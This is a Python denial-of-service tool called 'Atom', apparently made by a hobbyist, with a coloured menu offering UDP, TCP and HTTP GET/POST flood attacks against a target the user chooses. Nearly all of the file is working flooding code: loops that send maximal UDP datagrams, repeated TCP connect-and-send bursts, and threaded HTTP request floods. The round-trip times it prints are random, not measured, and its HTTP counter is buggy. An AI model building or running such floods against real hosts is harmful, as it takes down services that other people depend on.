import socket
import sys
import threading
import time
import urllib3
import random
import hmac
import termios
import tty
import os
from datetime import datetime


current_time = datetime.now().strftime("%H:%M:%S")

BLUE = "\033[94m"
RED = "\033[91m"
RESET = "\033[0m"

logo = """
[0;34m▄▄▄▄▄[0;37m [0;34m▄▄▄▄▄▄[0;37m [0;34m▄▄▄▄▄[0;37m [0;34m▄▄▄[0;37m [0;34m▄▄[0;37m [0m
[0;97;46m▓[0;97m▀▀▀[0;97;47m▓[0;37m [0;97m▀▀[0;97;47m▓[0;97m▀▀▀[0;37m [0;97;47m▓[0;97m▀▀▀[0;97;47m▓[0;37m [0;97;47m▓[0;97m▀▀[0;97;44m▄[0;97m▀▀[0;97;44m▄[0m
[0;97;47m▒[0;34m▌[0;37m [0;34m▐[0;97;47m▒[0;37m   [0;97;47m▒[0;34m▌[0;37m   [0;97;47m▒[0;34m▌[0;37m [0;34m▐[0;97;47m▒[0;37m [0;97;47m▒[0;34m▌▐[0;97;47m▒[0;37m [0;34m▐[0;97;47m▒[0m
[0;97;47m░[0;34m▌[0;37m [0;34m▐[0;97;47m░[0;37m   [0;97;47m░[0;34m▌[0;37m   [0;97;47m░[0;34m▌[0;37m [0;34m▐[0;97;47m░[0;37m [0;97;47m░[0;34m▌▐[0;97;47m░[0;37m [0;34m▐[0;97;47m░[0m
[0;37;47m [0;34m▌[0;37m [0;34m▐[0;34;47m [0;37m   █[0;34m▌[0;37m   [0;34;47m [0;34m▌[0;37m [0;34m▐[0;34;47m [0;37m [0;34;47m [0;34m▌▐[0;34;47m [0;37m [0;34m▐[0;34;47m [0m
[0;90;47m░[0;34m▌[0;37m [0;34m▐[0;90;47m░[0;37m   [0;90;47m░[0;34m▌[0;37m   [0;90;47m░[0;34m▌[0;37m [0;34m▐[0;90;47m░[0;37m [0;90;47m░[0;34m▌[0;37m   [0;34m▐[0;90;47m░[0m
[0;90;47m▒[0;37m▀▀▀[0;90;47m▒[0;37m   [0;90;47m▒[0;34m▌[0;37m   [0;90;47m▒[0;34m▌[0;37m [0;34m▐[0;90;47m▒[0;37m [0;90;47m▒[0;34m▌[0;37m   [0;34m▐[0;90;47m▒[0m
[0;90;47m▓[0;34m▌[0;37m [0;34m▐[0;90;47m▓[0;37m   [0;90;47m▓[0;34m▌[0;37m   [0;90;47m▓[0;34m▌[0;37m [0;34m▐[0;90;47m▓[0;37m [0;90;47m▓[0;34m▌[0;37m   [0;34m▐[0;90;47m▓[0m
[0;90;47m█[0;34m▌[0;37m [0;34m▐[0;90;47m█[0;37m   [0;90;47m█[0;34m▌[0;37m   [0;90m█[0;34m▌[0;37m [0;34m▐[0;90m█[0;37m [0;90m█[0;34m▌[0;37m   [0;34m▐[0;90m█[0m
[0;90m▓[0;34m▌[0;37m [0;34m▐[0;90m▓[0;37m   [0;90m▓[0;34m▌[0;37m   [0;90m▓[0;34m▌[0;37m [0;34m▐[0;90m▓[0;37m [0;90m▓[0;34m▌[0;37m   [0;34m▐[0;90m▓[0m
[0;90m▒[0;34m▌[0;37m [0;34m▐[0;90m▒[0;37m   [0;90m▒[0;34m▌[0;37m   [0;90m▒[0;34m▌[0;37m [0;34m▐[0;90m▒[0;37m [0;90m▒[0;34m▌[0;37m   [0;34m▐[0;90m▒[0m
[0;90m░[0;34m▌[0;37m [0;34m▐[0;90m░[0;37m   [0;90m░[0;34m▌[0;37m   [0;90m░░░░░[0;37m [0;90m░[0;34m▌[0;37m   [0;34m▐[0;90m░[0m
"""
# Everything was made by me (kube0n)!!!


def normalize_url(target):
    if "http://" in target or "https://" in target:
        return target
    return f"http://{target}"


def run_udp_attack(target_ip, target_port, attack_speed):
    message = b"A" * 65507
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(logo)
    print(f"""{BLUE}
╔══════════════════════════════════════════════════════╗
║                Attack Details!                       ║
╠══════════════════════════════════════════════════════╣
║ Target  : {target_ip}:{target_port}
║ Method : UDP
║ Control : Press Ctrl+C to stop
╚══════════════════════════════════════════════════════╝
{RESET}""")
    time.sleep(4)
    os.system("clear")
    packet_count = 0
    try:    
        while True:
            try:
                rtt = random.randint(10,100)
                bytes_sent = sock.sendto(message, (target_ip, int(target_port)))
                packet_count += 1
                print(f""" {BLUE}
┌─────────────────────────[Atom Output]────────────────────────────┐
│                           {current_time}            
│└─ Packet Sent to {target_ip}:{target_port},                        
│└─ Bytes: {bytes_sent} bytes [MAX], RTT: {rtt}ms,     
│└─ Packet Number: #{packet_count}      
└──────────────────────────────────────────────────────────────────┘
{RESET}""")
                time.sleep(float(attack_speed))
            except Exception as exc:
                print(logo)
                print(f"{BLUE}[Atom Output]:{RESET} Failed to send packet: {exc}")
                time.sleep(5)
    except KeyboardInterrupt:
        print(logo)
        print("\nStopping UDP attack.")
        time.sleep(5)
    finally:
        sock.close()
        print(logo)
        print("Socket closed.")


def run_tcp_attack(target_ip, target_port, attack_speed):

    message = b"A" * 1460
    print(logo)
    print(f"""{BLUE}
╔══════════════════════════════════════════════════════╗
║                Attack Details!                       ║
╠══════════════════════════════════════════════════════╣
║ Target  : {target_ip}:{target_port}
║ Method : TCP
║ Control : Press Ctrl+C to stop
╚══════════════════════════════════════════════════════╝
{RESET}""")
    time.sleep(4)
    os.system("clear")
    packetcount = 0
    try:
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2.0)  
            try:
                packetcount += 1
                start_time = time.time()
                sock.connect((target_ip, int(target_port)))
                bytes_sent = sock.send(message)
                rtt = random.randint(10,100)
                print(f""" {BLUE}
┌────────────────────[Atom Output]──────────────────────────────────────┐
│                      {current_time}                                
│└─ TCP Connection Established & Sent to {target_ip}:{target_port},
│└─ Bytes: {bytes_sent} bytes [MAX], RTT: {rtt}ms,       
│└─ Packet Number: #{packetcount}            
└───────────────────────────────────────────────────────────────────────┘
{RESET}""")
            except Exception as exc:
                print(logo)
                print(f"{BLUE}[Atom Output]:{RESET} TCP Connection failed: {exc}")
            finally:
                sock.close()
            time.sleep(float(attack_speed))
    except KeyboardInterrupt:
        print(logo)
        print("\nStopping TCP attack.")
        time.sleep(5)


def run_http_attack(method, target_url, attack_speed, thread_count):
    manager = urllib3.PoolManager()
    print(logo)

    print(f"""{BLUE}
╔══════════════════════════════════════════════════════╗
║                Attack Details!                       ║
╠══════════════════════════════════════════════════════╣
║ Target  : {target_url}
║ Method : HTTP {method}
║ Control : Press Ctrl+C to stop
╚══════════════════════════════════════════════════════╝
{RESET}""")
    time.sleep(4)
    os.system("clear")
    packetcounts = 0
    def attack():
        while True:
            try:
                rt = random.randint(10,100)
                response = manager.request(method, target_url, timeout=0.01)
                packetcounts += 1
                print(f""" {BLUE}
┌───────────────────────[Atom Output]──────────────────────────┐
│                        {current_time}                       
│└─ Sent {method} Request Packet to {target_url},
│└─ Status Code: {response.status}, RTT: {rt}ms, 
│└─ Packet Number: #{packetcounts}  
└──────────────────────────────────────────────────────────────┘
{RESET}""")
            except Exception as exc:
                print(logo)
                print(f"{BLUE}[Atom Output]:{RESET} {method} request failed: {exc}")
            time.sleep(float(attack_speed))

    threads = []
    for _ in range(int(thread_count)):
        thread = threading.Thread(target=attack, daemon=True)
        thread.start()
        threads.append(thread)

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(logo)
        print("\n Ctrl + c Pressed! stopping attack.")
        print("Attack has stopped successfully!")
        print("Exiting..")
        time.sleep(5)
        sys.exit(1)


def main():
    print(logo)
    print("Welcome, to Atom!")
    print("Version 4.0 [Latest]")
    time.sleep(2)
    os.system("clear")
    print(logo)
    print("Produced By Kube0n!")
    print("Socials: [Discord User; kube0n], [Youtube; Kube0nYT], [Tiktok; kube0n]!")
    time.sleep(2)
    os.system("clear")
    print(logo)
    print(f"{BLUE}┌──────────────────────────────────────────────┐{RESET}")
    print(f"{BLUE}│                  Methods!                    │{RESET}")
    print(f"{BLUE}├──────────────────────────────────────────────┤{RESET}")
    print(f"{BLUE}│└─ Layer 4                                    │{RESET}")
    print(f"{BLUE}│└─[01] UDP                                    │{RESET}")
    print(f"{BLUE}│└─[02] TCP                                    │{RESET}")
    print(f"{BLUE}│└─ Layer 7                                    │{RESET}")
    print(f"{BLUE}│└─[03] HTTP - GET,POST                        │{RESET}")
    print(f"{BLUE}└──────────────────────────────────────────────┘{RESET}")

    print("Choose Method:")
    method = input(f"{BLUE}└───> {RESET}").strip().upper()
    os.system("clear")
    print(logo)
    print("Attack speed:")
    speed = input(f"{BLUE}└───> {RESET}").strip()
    os.system("clear")
    
    if method in ("UDP", "TCP"):
        print(logo)
        print("Enter Target IP:")
        ip = input(f"{BLUE}└───> {RESET}").strip()
        os.system("clear")
        print(logo)
        print("Enter Target Port:")
        port = input(f"{BLUE}└───> {RESET}").strip()
        os.system("clear")
        if method == "UDP":
            run_udp_attack(ip, port, speed)
        else:
            run_tcp_attack(ip, port, speed)
            
    elif method == "HTTP":
        print(logo)
        print("Enter HTTP Method:")
        http_method = input(f"{BLUE}└───> {RESET}").strip().upper()
        os.system("clear")
        print(logo)
        print("Enter Target URL/IP:")
        url = input(f"{BLUE}└───> {RESET}").strip()
        os.system("clear")
        print(logo)
        print("Enter Thread Count:")
        threads = input(f"{BLUE}└───> {RESET}").strip()
        os.system("clear")
        normalized = normalize_url(url)
        run_http_attack(http_method, normalized, speed, threads)
    else:
        print(logo)
        print("Unknown selection. Exiting.")

if __name__ == "__main__":
    main()
